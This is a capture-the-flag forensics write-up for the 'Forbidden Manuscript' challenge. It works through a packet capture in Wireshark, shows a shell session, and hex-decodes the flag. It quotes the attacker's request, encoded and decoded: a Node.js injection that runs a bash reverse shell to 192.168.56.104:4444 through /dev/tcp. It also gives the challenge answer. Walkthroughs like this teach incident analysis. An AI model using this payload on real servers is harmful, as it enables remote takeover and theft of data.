---
layout: default
title: Forbidden Manuscript
---

# [Hack The Boo 2024 - Practice](index.md) - Forensics - Forbidden Manuscript

> On the haunting night of Halloween, the website of "Shadowbrook Library"—a digital vault of forbidden and arcane manuscripts—was silently breached by an unknown entity. Though the site appears unaltered, unsettling anomalies suggest something sinister has been stolen from its cryptic depths. Ominous network traffic logs from the time of the intrusion have emerged. Your task is to delve into this data and uncover any dark secrets that were exfiltrated.

We're provided with a zip file containing a .pcapng file - a packet capture (likely of some network traffic). There are several great tools for inspecting these files, but the easiest is Wireshark.

There aren't many captured frames here (156) so its easy to just skim through them to see if anything jumps out. Frame #103 has the word "exploit" in the request URL, which I'd say is fairly suspicious.

The entire HTTP request url is:
```
http://shadowbrook.htb/?user=exploit%28%29%20%7B%7D%20%26%26%20%28%28%28%29%3D%3E%7B%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4444%200%3E%261%27%22%29%3B%20%7D%29%28%29%29%20%26%26%20function%20pwned
```
This is "htmlencoded", so we can make it more readable by "htmldecoding" it. I used an online tool [https://www.urldecoder.io/](https://www.urldecoder.io/)

```
http://shadowbrook.htb/?user=exploit() {} && ((()=>{ global.process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/192.168.56.104/4444 0>&1'"); })()) && function pwned
```

That all looks very suspicious, but none of it is a flag for this challenge, so we'll need to keep looking.

In addition to the HTTP stream, there is a TCP stream in this file that we can inspect. Right clicking any of the TCP frames (I used frame #121), and selecting **Follow** -> **TCP Stream**, we can see if there is anything human-readable here.

```
.]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# ls
ls
data
docker-compose.yml
Dockerfile
node_modules
package.json
package-lock.json
src
.]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# ls /
ls /
bin
bin.usr-is-merged
boot
cdrom
dev
etc
flag
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
snap
srv
swap.img
sys
tmp
usr
var
.]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# cat /flag
cat /flag
4854427b66307262316464336e5f6d346e753563723170375f31355f316e5f3768335f77316c647d
.]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# exit
exit
exit
```

Looks like this is some output from a remote shell of some sort (likely the one we saw get installed via the HTTP stream). 

We see an `ls` command, and the output from that command.
We then see the command `cat /flag`, and the following output:

```
4854427b66307262316464336e5f6d346e753563723170375f31355f316e5f3768335f77316c647d
```

This looks a bit like a base64 encoded string at first glance, but its has some differences - notably that we don't see any characters that are alphabetically after the letter "F", which may indicate that this is actually hex encoded.

Cyberchef makes this easy to test. It's not [base64](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=NDg1NDQyN2I2NjMwNzI2MjMxNjQ2NDMzNmU1ZjZkMzQ2ZTc1MzU2MzcyMzE3MDM3NWYzMTM1NWYzMTZlNWYzNzY4MzM1Zjc3MzE2YzY0N2Q&oeol=CR), all we get here is gibberish.

[From Hex](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NDg1NDQyN2I2NjMwNzI2MjMxNjQ2NDMzNmU1ZjZkMzQ2ZTc1MzU2MzcyMzE3MDM3NWYzMTM1NWYzMTZlNWYzNzY4MzM1Zjc3MzE2YzY0N2Q&oeol=CR) gets us the flag though, so it looks like it was hex encoded.

```
HTB{f0rb1dd3n_m4nu5cr1p7_15_1n_7h3_w1ld}
```